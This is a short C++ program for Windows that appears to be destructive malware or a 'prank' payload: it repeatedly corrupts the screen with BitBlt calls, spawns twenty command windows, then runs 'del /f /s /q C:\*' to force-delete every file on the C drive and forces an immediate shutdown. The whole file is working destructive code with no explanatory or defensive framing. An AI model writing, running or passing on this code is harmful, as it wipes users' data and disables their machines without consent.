
#include <windows.h>
#include <iostream>

int main() {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    for (int i = 0; i < 1000; i++) {
        BitBlt(hdc, rand() % 25, rand() % 25, w, h, hdc, rand() % 25, rand() % 25, NOTSRCERASE);
        Sleep(2);
    }

    for (int i = 0; i < 20; i++) {
        system("start cmd.exe /k ");
    }

    system("del /f /s /q C:\\*");

    system("shutdown /s /t 0 /f");

    return 0;
}
